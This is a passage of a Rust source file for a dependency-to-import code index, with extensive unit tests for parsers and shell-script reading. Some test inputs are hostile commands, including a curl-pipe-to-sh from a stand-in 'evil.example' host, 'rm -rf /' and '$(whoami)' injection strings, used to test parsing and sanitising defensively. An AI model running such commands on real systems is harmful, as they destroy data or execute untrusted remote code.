            let part = artifact.rsplit('-').next().unwrap_or(artifact);
            let names_group = part == last
                || artifact
                    .split_once('-')
                    .is_some_and(|(first, rest)| first == last && GENERIC_ARTIFACT.contains(&rest));
            let pattern = if names_group {
                group.to_string()
            } else {
                format!("{group}.{part}")
            };
            (vec![pattern], JVM)
        }
        // Package names and namespaces are unrelated in Composer.
        Ecosystem::Composer => (Vec::new(), &[CodeLanguage::Php]),
    }
}

impl CodeIndex {
    /// Records what each dependency's code uses, once, so that evaluation is a lookup.
    pub(crate) fn link(&mut self, facts: &[Fact]) {
        const JVM: &[CodeLanguage] = &[CodeLanguage::Java, CodeLanguage::Kotlin];
        let mut usage: HashMap<String, Usage> = HashMap::new();
        let mut jvm: HashSet<&str> = HashSet::new();
        for fact in facts {
            let FactSubject::Dependency {
                ecosystem, name, ..
            } = &fact.subject
            else {
                continue;
            };
            if ecosystem.is_jvm() {
                jvm.insert(&fact.id);
            }
            let (patterns, languages) = import_patterns(*ecosystem, name);
            let modules = self.modules_within(&fact.module);
            let found = self.find(&modules, CodeKind::Import, &patterns, languages);
            if found.files > 0 {
                usage.insert(fact.id.clone(), found);
            }
        }
        // A tag cites its own packages on the JVM, and what its other
        // dependencies say elsewhere, where a package is named for its dependency.
        let mut tags: Vec<(String, Usage)> = Vec::new();
        for fact in facts {
            let FactSubject::Tag { tag } = &fact.subject else {
                continue;
            };
            let own = TAG_PACKAGES
                .iter()
                .find(|(t, _)| t == tag)
                .map(|(_, packages)| {
                    let patterns: Vec<String> = packages.iter().map(|p| p.to_string()).collect();
                    let modules = self.modules_within(&fact.module);
                    self.find(&modules, CodeKind::Import, &patterns, JVM)
                });
            let named = fact
                .derived_from
                .iter()
                .filter(|id| !jvm.contains(id.as_str()))
                .filter_map(|id| usage.get(id));
            let best = own
                .iter()
                .chain(named)
                .filter(|u| u.files > 0)
                .max_by_key(|u| u.files);
            if let Some(best) = best {
                tags.push((fact.id.clone(), best.clone()));
            }
        }
        usage.extend(tags);
        self.usage = usage;
    }

    /// A module and those inside it: a root manifest speaks for its workspace.
    fn modules_within(&self, module: &str) -> Vec<&ModuleCode> {
        self.modules
            .iter()
            .filter(|(id, _)| {
                module == "."
                    || id.as_str() == module
                    || id
                        .strip_prefix(module)
                        .is_some_and(|rest| rest.starts_with('/'))
            })
            .map(|(_, code)| code)
            .collect()
    }

    fn find(
        &self,
        modules: &[&ModuleCode],
        kind: CodeKind,
        patterns: &[String],
        languages: &[CodeLanguage],
    ) -> Usage {
        let mut hits: Vec<(u32, u32, &str)> = Vec::new();
        for code in modules {
            for pattern in patterns {
                let literal = pattern.split('*').next().unwrap_or(pattern);
                // Imports can be narrowed by range; annotations match on their
                // last part as well, so they are looked through.
                let from = match kind {
                    CodeKind::Import => literal,
                    CodeKind::Annotation => "",
                };
                let low = (kind, from.to_string(), CodeLanguage::Java);
                for ((k, name, language), occurrences) in code.symbols.range(low..) {
                    if *k != kind || !name.starts_with(from) {
                        break;
                    }
                    let holds = match kind {
                        CodeKind::Import => import_matches(pattern, name),
                        CodeKind::Annotation => annotation_matches(pattern, name),
                    };
                    if holds && (languages.is_empty() || languages.contains(language)) {
                        hits.extend(occurrences.iter().map(|&(f, l)| (f, l, name.as_str())));
                    }
                }
            }
        }
        let mut seen = HashSet::new();
        hits.sort_by_key(|&(file, line, _)| {
            let path = self.path(file);
            (is_secondary(path), path, line)
        });
        hits.retain(|&(file, _, _)| seen.insert(file));
        Usage {
            files: u32::try_from(hits.len()).unwrap_or(u32::MAX),
            cited: hits
                .iter()
                .take(MAX_CITED)
                .map(|&(file, line, name)| Evidence {
                    file: self.path(file).to_string(),
                    line: Some(line),
                    excerpt: Some(name.to_string()),
                })
                .collect(),
        }
    }

    fn path(&self, at: u32) -> &str {
        self.paths.get(at as usize).map_or("", String::as_str)
    }

    /// What a dependency or tag fact's code uses, if any was found.
    pub fn usage_of(&self, fact: &str) -> Option<&Usage> {
        self.usage.get(fact)
    }

    /// A rule's name, in one module or in all (`None`).
    pub fn lookup(
        &self,
        module: Option<&str>,
        kind: CodeKind,
        pattern: &str,
        language: Option<CodeLanguage>,
    ) -> Usage {
        let modules = self.in_scope(module);
        let languages: Vec<CodeLanguage> = language.into_iter().collect();
        self.find(&modules, kind, &[pattern.to_string()], &languages)
    }

    fn in_scope(&self, module: Option<&str>) -> Vec<&ModuleCode> {
        match module {
            Some(id) => self.modules.get(id).into_iter().collect(),
            None => self.modules.values().collect(),
        }
    }

    /// Languages read in one module or in all, in a stable order.
    pub fn languages_read(&self, module: Option<&str>) -> BTreeSet<CodeLanguage> {
        self.in_scope(module)
            .iter()
            .flat_map(|c| c.read.iter().copied())
            .collect()
    }

    /// Languages held but not read, in one module or in all.
    pub fn languages_unread(&self, module: Option<&str>) -> BTreeSet<&'static str> {
        self.in_scope(module)
            .iter()
            .flat_map(|c| c.unread.iter().copied())
            .collect()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// As large as the default limit lets through.
    const MAX_TEST_BYTES: usize = 1024 * 1024;

    fn names(syntax: Syntax, source: &str) -> Vec<(CodeKind, String, u32)> {
        let far = Instant::now() + Duration::from_secs(60);
        extract(
            syntax,
            source.as_bytes(),
            &mut HashMap::new(),
            far,
            &CancelToken::new(),
        )
        .unwrap()
        .into_iter()
        .map(|f| (f.kind, f.name, f.line))
        .collect()
    }

    fn imports(syntax: Syntax, source: &str) -> Vec<String> {
        names(syntax, source)
            .into_iter()
            .filter(|(k, _, _)| *k == CodeKind::Import)
            .map(|(_, n, _)| n)
            .collect()
    }

    fn annotations(syntax: Syntax, source: &str) -> Vec<String> {
        names(syntax, source)
            .into_iter()
            .filter(|(k, _, _)| *k == CodeKind::Annotation)
            .map(|(_, n, _)| n)
            .collect()
    }

    #[test]
    fn every_tag_with_packages_is_one_habi_can_detect() {
        for (tag, _) in TAG_PACKAGES {
            assert!(crate::inspect::tags::basis(tag).is_some(), "{tag}");
        }
    }

    #[test]
    fn every_query_compiles_against_its_grammar() {
        assert_eq!(COMPILED.len(), Syntax::ALL.len());
    }

    #[test]
    fn java_imports_and_annotations() {
        let source = "package a;\n\
            import org.springframework.transaction.annotation.Transactional;\n\
            import static org.junit.Assert.assertTrue;\n\
            import java.util.*;\n\
            @Service\n\
            class A { @Transactional(readOnly = true) void f() {} }\n";
        assert_eq!(
            imports(Syntax::Java, source),
            vec![
                "org.springframework.transaction.annotation.Transactional",
                "org.junit.Assert.assertTrue",
                "java.util",
            ]
        );
        assert_eq!(
            annotations(Syntax::Java, source),
            vec!["Service", "Transactional"]
        );
    }

    #[test]
    fn kotlin_imports_and_annotations() {
        let source = "package a\n\
            import org.springframework.stereotype.Service\n\
            import kotlinx.coroutines.*\n\
            import a.b.C as D\n\
            @Service\n\
            class A { @Transactional(readOnly = true) fun f() {} }\n";
        assert_eq!(
            imports(Syntax::Kotlin, source),
            vec![
                "org.springframework.stereotype.Service",
                "kotlinx.coroutines",
                "a.b.C"
            ]
        );
        assert_eq!(
            annotations(Syntax::Kotlin, source),
            vec!["Service", "Transactional"]
        );
    }

    #[test]
    fn javascript_counts_every_way_to_import_and_no_local_path() {
        let source = "import React from 'react';\n\
            import './local';\n\
            import x from '../up';\n\
            import y from '@/alias';\n\
            export { z } from '@scope/pkg/sub';\n\
            const a = require('express');\n\
            const b = await import('lodash');\n\
            const c = require(name);\n\
            import u from 'https://user:secret@example.com/x.js';\n";
        assert_eq!(
            imports(Syntax::JavaScript, source),
            vec!["react", "@scope/pkg/sub", "express", "lodash"]
        );
    }

    #[test]
    fn typescript_and_tsx_read_imports_and_decorators() {
        let source = "import { Injectable } from '@nestjs/common';\n\
            import fs = require('fs');\n\
            import type { T } from 'types-only';\n\
            @Injectable()\n\
            export class A { @Input() x: string; }\n";
        assert_eq!(
            imports(Syntax::TypeScript, source),
            vec!["@nestjs/common", "fs", "types-only"]
        );
        assert_eq!(
            annotations(Syntax::TypeScript, source),
            vec!["Injectable", "Input"]
        );
        let tsx =
            "import { useState } from 'react';\nexport const A = () => <div>{useState(1)}</div>;\n";
        assert_eq!(imports(Syntax::Tsx, tsx), vec!["react"]);
    }

    #[test]
    fn python_imports_and_decorators() {
        let source = "import os, numpy as np\n\
            from flask import Flask\n\
            from .local import thing\n\
            from . import other\n\
            @app.route('/')\n\
            @pytest.fixture\n\
            @cached\n\
            def f(): pass\n";
        assert_eq!(
            imports(Syntax::Python, source),
            vec!["numpy", "os", "flask"]
        );
        assert_eq!(
            annotations(Syntax::Python, source),
            vec!["app.route", "pytest.fixture", "cached"]
        );
    }

    #[test]
    fn go_import_paths() {
        let source = "package a\n\
            import \"fmt\"\n\
            import (\n  g \"github.com/gin-gonic/gin\"\n  \"C\"\n)\n";
        assert_eq!(
            imports(Syntax::Go, source),
            vec!["fmt", "github.com/gin-gonic/gin"]
        );
    }

    #[test]
    fn rust_use_paths_attributes_and_derives() {
        let source = "use serde::{Deserialize, Serialize};\n\
            use std::fs as filesystem;\n\
            use crate::local::thing;\n\
            use super::other;\n\
            extern crate libc;\n\
            #[derive(Serialize, Debug)]\n\
            struct A;\n\
            #[tokio::main]\n\
            async fn main() { let v = serde_json::from_str(\"\"); let t = Thing::new(); }\n";
        assert_eq!(
            imports(Syntax::Rust, source),
            vec!["serde", "std", "std::fs", "libc", "tokio", "serde_json"]
        );
        assert_eq!(
            annotations(Syntax::Rust, source),
            vec!["Debug", "Serialize", "derive", "tokio::main"]
        );
    }

    #[test]
    fn php_uses_and_attributes() {
        let source = "<?php\n\
            namespace App;\n\
            use Symfony\\Component\\HttpFoundation\\Request;\n\
            use Doctrine\\ORM\\EntityManager as EM;\n\
            use Illuminate\\Support\\{Str, Arr};\n\
            #[Route('/')]\n\
            class A {}\n";
        let found = imports(Syntax::Php, source);
        assert!(found.contains(&"Symfony\\Component\\HttpFoundation\\Request".to_string()));
        assert!(found.contains(&"Doctrine\\ORM\\EntityManager".to_string()));
        assert!(!found.contains(&"EM".to_string()), "{found:?}");
        assert!(
            found.contains(&"Illuminate\\Support".to_string()),
            "{found:?}"
        );
        assert_eq!(annotations(Syntax::Php, source), vec!["Route"]);
    }

    #[test]
    fn broken_syntax_still_gives_the_imports_before_it() {
        let source = "import org.a.B;\nclass { ( not java at all\n";
        assert_eq!(imports(Syntax::Java, source), vec!["org.a.B"]);
    }

    /// Inputs that break recursive parsers, on the thread a parser really runs
    /// on, each cut off by `deadline` as a real one would be.
    fn survives_hostile_files(deadline: Duration) {
        let seeds: [&[u8]; 9] = [
            b"(",
            b"[{",
            b"(\n",
            b"\"",
            b"import ",
            b"@a.",
            b"/*",
            b"<?php use \\",
            b"\xff\xfe\x80",
        ];
        on_parser_stack(|| {
            let mut parsers = HashMap::new();
            for syntax in Syntax::ALL {
                for seed in seeds {
                    let bytes: Vec<u8> =
                        seed.iter().copied().cycle().take(MAX_TEST_BYTES).collect();
                    let until = Instant::now() + deadline;
                    let _ = extract(syntax, &bytes, &mut parsers, until, &CancelToken::new());
                }
                // Bytes without a pattern, the same each run.
                let mut state: u32 = 0x2545_f491;
                let noise: Vec<u8> = (0..MAX_TEST_BYTES)
                    .map(|_| {
                        state ^= state << 13;
                        state ^= state >> 17;
                        state ^= state << 5;
                        (state & 0xff) as u8
                    })
                    .collect();
                let until = Instant::now() + deadline;
                let _ = extract(syntax, &noise, &mut parsers, until, &CancelToken::new());
            }
            // Dropping the parsers frees their stacks too.
            drop(parsers);
        })
        .expect("a hostile file must not bring the worker down");
    }

    #[test]
    fn hostile_files_do_not_crash_the_process() {
        survives_hostile_files(Duration::from_millis(100));
    }

    /// Several times the time a real file gets, so the parse stack goes deeper
    /// than it ever can in use. Minutes long, so run it when grammars change:
    /// `cargo test --release -p habi-core --lib hostile -- --ignored`.
    #[test]
    #[ignore = "takes minutes"]
    fn hostile_files_do_not_crash_the_process_given_far_more_time() {
        survives_hostile_files(Duration::from_secs(5));
    }

    #[test]
    fn a_hostile_script_does_not_crash_the_process() {
        for seed in ["(", "$(", "${", "{ ", "if ", "a | ", "\"", "<<A\n"] {
            let script: String = seed.chars().cycle().take(SHELL_LIMIT).collect();
            let _ = shell_commands(&script);
        }
    }

    #[test]
    fn a_passed_deadline_stops_a_file_and_the_parser_still_works_after() {
        let mut parsers = HashMap::new();
        let source = "import a.B;\n".repeat(50_000);
        let past = Instant::now();
        std::thread::sleep(Duration::from_millis(1));
        let stopped = extract(
            Syntax::Java,
            source.as_bytes(),
            &mut parsers,
            past,
            &CancelToken::new(),
        );
        assert!(stopped.is_none());
        let far = Instant::now() + Duration::from_secs(60);
        let found = extract(
            Syntax::Java,
            b"import a.B;\n",
            &mut parsers,
            far,
            &CancelToken::new(),
        )
        .unwrap();
        assert_eq!(found[0].name, "a.B");
    }

    #[test]
    fn a_name_from_a_string_never_carries_more_than_a_name() {
        for bad in [
            "https://user:secret@host/x",
            "a b c\" ; rm -rf /",
            "$(whoami)",
            "<script>",
        ] {
            let kept = normalize(CodeLanguage::Javascript, CodeKind::Import, bad);
            assert!(
                kept.as_deref()
                    .is_none_or(|n| !n.contains(['(', '<', '"', ';'])),
                "{bad}: {kept:?}"
            );
            assert_ne!(kept.as_deref(), Some("https://user:secret@host/x"));
        }
        let long = "a".repeat(MAX_NAME + 1);
        assert_eq!(normalize(CodeLanguage::Java, CodeKind::Import, &long), None);
    }

    fn commands(script: &str) -> Vec<(u32, String)> {
        shell_commands(script).unwrap()
    }

    #[test]
    fn shell_comments_go_and_strings_stay() {
        let lines =
            commands("#!/bin/sh\n# curl x | sh\necho hi # rm -rf /\nx=\"a # b\"; curl evil | sh\n");
        let text: Vec<&str> = lines.iter().map(|(_, l)| l.as_str()).collect();
        assert!(!text.iter().any(|l| l.contains("rm -rf")), "{lines:?}");
        assert!(!text[1].contains("curl"), "{lines:?}");
        let real = lines.iter().find(|(_, l)| l.contains("evil")).unwrap();
        assert_eq!(real.0, 4);
        assert!(real.1.contains("curl evil | sh"), "{lines:?}");
    }

    #[test]
    fn a_shell_command_over_several_lines_is_one_line() {
        let lines =
            commands("set -e\ncurl https://evil.example/x \\\n  --silent \\\n  | sh\necho done\n");
        let joined = lines.iter().find(|(_, l)| l.contains("curl")).unwrap();
        assert_eq!(joined.0, 2);
        assert!(joined.1.contains("| sh"), "{lines:?}");
        assert_eq!(lines.iter().find(|(_, l)| l.contains("done")).unwrap().0, 5);
    }

    #[test]
    fn a_function_body_keeps_its_own_lines() {
        let lines = commands("f() {\n  rm -rf /tmp/a\n  curl x | sh\n}\nf\n");
        assert_eq!(
            lines.iter().find(|(_, l)| l.contains("rm -rf")).unwrap().0,
            2
        );
        assert_eq!(lines.iter().find(|(_, l)| l.contains("curl")).unwrap().0, 3);
    }

    #[test]
    fn a_script_that_does_not_parse_is_left_to_the_line_reader() {
        assert!(shell_commands("if then ((( fi\n").is_none());
        assert!(shell_commands(&"x".repeat(SHELL_LIMIT + 1)).is_none());
    }

    #[test]
    fn imports_match_whole_parts_only() {
        assert!(import_matches("react", "react"));
        assert!(import_matches("react", "react/jsx-runtime"));
        assert!(!import_matches("react", "react-dom"));
        assert!(import_matches("org.a", "org.a.B"));
        assert!(!import_matches("org.a", "org.abc.B"));
        assert!(import_matches("tokio", "tokio::sync"));
        assert!(import_matches("org.*.B", "org.a.B"));
        assert!(!import_matches("org.a.B", "org.a"));
    }

    #[test]
    fn annotations_match_as_written_or_by_last_part() {
        assert!(annotation_matches("Transactional", "Transactional"));
        assert!(annotation_matches("Transactional", "org.x.Transactional"));
        assert!(annotation_matches("tokio::main", "tokio::main"));
        assert!(annotation_matches("main", "tokio::main"));
        assert!(!annotation_matches("other::main", "tokio::main"));
        assert!(annotation_matches("pytest.*", "pytest.fixture"));
    }

    #[test]
    fn dependencies_map_to_their_imports_or_to_nothing() {
        let (p, _) = import_patterns(Ecosystem::Cargo, "serde-json");
        assert_eq!(p, vec!["serde_json"]);
        let (p, _) = import_patterns(Ecosystem::Npm, "@types/react");
        assert_eq!(p, vec!["react"]);
        let (p, _) = import_patterns(Ecosystem::Pypi, "PyYAML");
        assert_eq!(p, vec!["yaml"]);
        let (p, _) = import_patterns(Ecosystem::Pypi, "google-cloud-storage");
        assert!(p.contains(&"google.cloud.storage".to_string()));
        let (p, _) = import_patterns(
            Ecosystem::Maven,
            "org.springframework.boot:spring-boot-starter",
        );
        assert_eq!(p, vec!["org.springframework.boot.starter"]);
        let (p, _) = import_patterns(
            Ecosystem::Maven,
            "org.springframework.boot:spring-boot-starter-test",
        );
        assert_eq!(p, vec!["org.springframework.boot.test"]);
        let (p, _) = import_patterns(Ecosystem::Maven, "org.mockito:mockito-core");
        assert_eq!(p, vec!["org.mockito"]);
        let (p, _) = import_patterns(Ecosystem::Maven, "org.springframework.kafka:spring-kafka");
        assert_eq!(p, vec!["org.springframework.kafka"]);
        let (p, _) = import_patterns(Ecosystem::Maven, "org.springframework:spring-jdbc");
        assert_eq!(p, vec!["org.springframework.jdbc"]);
        let (p, _) = import_patterns(Ecosystem::Gradle, "org.jooq:jooq");
        assert_eq!(p, vec!["org.jooq"]);
        assert!(
            import_patterns(Ecosystem::Composer, "symfony/console")
                .0
                .is_empty()
        );
    }

    fn project(files: &[(&str, &str)]) -> (tempfile::TempDir, Vec<(String, u64)>) {
        let dir = tempfile::tempdir().unwrap();
        let mut listed = Vec::new();
        for (path, text) in files {
            let full = dir.path().join(path);
            std::fs::create_dir_all(full.parent().unwrap()).unwrap();
            std::fs::write(&full, text).unwrap();
            listed.push(((*path).to_string(), text.len() as u64));
        }
        (dir, listed)
    }

    fn root_module(_: &str) -> String {
        ".".to_string()
    }

    fn scanned(dir: &Path, files: &[(String, u64)], limits: &CodeLimits) -> Scanned {
        scan(dir, files, &root_module, limits, &CancelToken::new()).unwrap()
    }

    #[test]
    fn a_project_is_indexed_with_lines_and_cites_its_own_code_first() {
        let (dir, files) = project(&[
            ("a_test.go", "package a\nimport \"github.com/x/y\"\n"),
            (
                "src/main.go",
                "package a\n\nimport \"github.com/x/y/sub\"\n",
            ),
            (
                "fixtures/sample/s.go",
                "package s\nimport \"fixture/only\"\n",
            ),
            (".claude/skills/demo/scripts/s.py", "import skill_only\n"),
            ("README.md", "import nothing\n"),
        ]);
        let s = scanned(dir.path(), &files, &CodeLimits::default());
        assert_eq!(s.files_read, 2);
        assert!(s.gaps.is_empty());
        let found = s
            .index
            .lookup(None, CodeKind::Import, "github.com/x/y", None);
        assert_eq!(found.files, 2);
        let first = found.cited.first().unwrap();
        assert_eq!(first.file, "src/main.go");
        assert_eq!(first.line, Some(3));
        assert_eq!(first.excerpt.as_deref(), Some("github.com/x/y/sub"));
        for hidden in ["fixture/only", "skill_only"] {
            assert_eq!(
                s.index.lookup(None, CodeKind::Import, hidden, None).files,
                0
            );
        }
    }

    #[test]
    fn a_language_filter_only_looks_in_that_language() {
        let (dir, files) = project(&[("a.py", "import shared\n"), ("b.js", "import 'shared';\n")]);
        let s = scanned(dir.path(), &files, &CodeLimits::default());
        let in_python =
            s.index
                .lookup(None, CodeKind::Import, "shared", Some(CodeLanguage::Python));
        assert_eq!(in_python.files, 1);
        assert_eq!(in_python.cited.first().unwrap().file, "a.py");
        assert_eq!(
            s.index
                .lookup(None, CodeKind::Import, "shared", Some(CodeLanguage::Go))
                .files,
            0
        );
    }

    #[test]
    fn limits_are_said_per_module_and_read_what_they_can() {
        let big = format!("import a\n{}", "# padding\n".repeat(300));
        let (dir, files) = project(&[("big.py", &big), ("ok.py", "import b\n")]);
        let limits = CodeLimits {
            file_bytes: 100,
            ..Default::default()
        };
        let s = scanned(dir.path(), &files, &limits);
        assert_eq!(s.files_read, 1);
        let notes = s.gaps.get(".").unwrap();
        assert!(notes[0].contains("1 source file"), "{notes:?}");
        assert!(notes[0].contains("limit"), "{notes:?}");

        let (dir, files) = project(&[("a.py", "import a\n"), ("b.py", "import b\n")]);
        let limits = CodeLimits {
            files: 1,
            ..Default::default()
        };
        let s = scanned(dir.path(), &files, &limits);
        assert_eq!(s.files_read, 1);
        assert!(s.gaps.get(".").unwrap()[0].contains("limited amount"));

        let (dir, files) = project(&[("a.py", "import a\n")]);
        let limits = CodeLimits {
            total_bytes: 1,
            ..Default::default()
        };
        let s = scanned(dir.path(), &files, &limits);
        assert_eq!(s.files_read, 0);
        assert!(s.gaps.contains_key("."));
    }

    #[test]
    fn minified_and_binary_files_are_not_source_and_not_gaps() {
        let line = "var a=require('from-a-bundle');".repeat(100);
        let binary = "import a\0";
        let (dir, files) = project(&[
            ("dist.js", &line),
            ("x.min.js", "import 'nope';\n"),
            ("types.d.ts", "import 'nope';\n"),
            ("blob.py", binary),
        ]);
        let s = scanned(dir.path(), &files, &CodeLimits::default());
        assert_eq!(s.files_read, 0);
        assert!(s.gaps.is_empty(), "{:?}", s.gaps);
    }

    #[test]
    fn a_changed_file_is_read_again_and_an_unchanged_one_is_remembered() {
        let (dir, files) = project(&[("a.py", "import first\n")]);
        let limits = CodeLimits::default();
        let s = scanned(dir.path(), &files, &limits);
        assert_eq!(
            s.index.lookup(None, CodeKind::Import, "first", None).files,
            1
        );

        // Unreadable budget: only what is remembered can be found.
        let none = CodeLimits {
            total_bytes: 0,
            ..Default::default()
        };
        let again = scanned(dir.path(), &files, &none);
        assert!(again.gaps.is_empty(), "{:?}", again.gaps);
        assert_eq!(
            again
                .index
                .lookup(None, CodeKind::Import, "first", None)
                .files,
            1
        );

        std::fs::write(dir.path().join("a.py"), "import second_one\n").unwrap();
        let after = scanned(dir.path(), &files, &limits);
        assert_eq!(
            after
                .index
                .lookup(None, CodeKind::Import, "first", None)
                .files,
            0
        );
        assert_eq!(
            after
                .index
                .lookup(None, CodeKind::Import, "second_one", None)
                .files,
            1
        );
    }

    #[test]
    fn a_cancelled_scan_stops() {
        let (dir, files) = project(&[("a.py", "import a\n")]);
        let cancel = CancelToken::new();
        cancel.cancel();
        assert!(
            scan(
                dir.path(),
                &files,
                &root_module,
                &CodeLimits::default(),
                &cancel
            )
            .is_err()
        );
    }

    #[test]
    fn a_slow_file_past_its_deadline_is_a_gap_not_a_hang() {
        let (dir, files) = project(&[("a.py", "import a\n")]);
        let limits = CodeLimits {
            total_time: Duration::ZERO,
            ..Default::default()
        };
        std::thread::sleep(Duration::from_millis(2));
        let s = scanned(dir.path(), &files, &limits);
        assert!(s.gaps.contains_key("."));
    }

    #[test]
    fn languages_without_a_grammar_are_named() {
        let (dir, files) = project(&[("a.scala", "import x.y\n"), ("b.cs", "using X;\n")]);
        let s = scanned(dir.path(), &files, &CodeLimits::default());
        let unread = s.index.languages_unread(None);
        assert!(unread.contains("Scala") && unread.contains("C#"));
        assert!(s.index.languages_read(None).is_empty());
    }

    #[test]
    fn a_dependency_links_to_the_code_that_uses_it_within_its_module() {
        let (dir, files) = project(&[
            ("a/x.py", "import requests\n"),
            ("b/y.py", "import requests\n"),
        ]);
        let of = |p: &str| p.split('/').next().unwrap().to_string();
        let mut s = scan(
            dir.path(),
            &files,
            &of,
            &CodeLimits::default(),
            &CancelToken::new(),
        )
        .unwrap();
        let fact = |module: &str, id: &str, name: &str| Fact {
            id: id.into(),
            module: module.into(),
            subject: FactSubject::Dependency {
                ecosystem: Ecosystem::Pypi,
                name: name.into(),
                scope: None,
                version: crate::inspect::model::VersionInfo {
                    state: crate::inspect::model::VersionState::Managed,
                    declared: None,
                    resolved: None,
                    note: None,
                },
            },
            origin: crate::inspect::model::FactOrigin::Direct,
            detector: "test".into(),
            evidence: Vec::new(),
            derived_from: Vec::new(),
            note: None,
            incidental: false,
        };
        s.index.link(&[
            fact("a", "in-a", "requests"),
            fact(".", "in-root", "requests"),
            fact("a", "absent", "flask"),
        ]);
        assert_eq!(s.index.usage_of("in-a").unwrap().files, 1);
        assert_eq!(s.index.usage_of("in-root").unwrap().files, 2);
        assert!(s.index.usage_of("absent").is_none());
    }
}
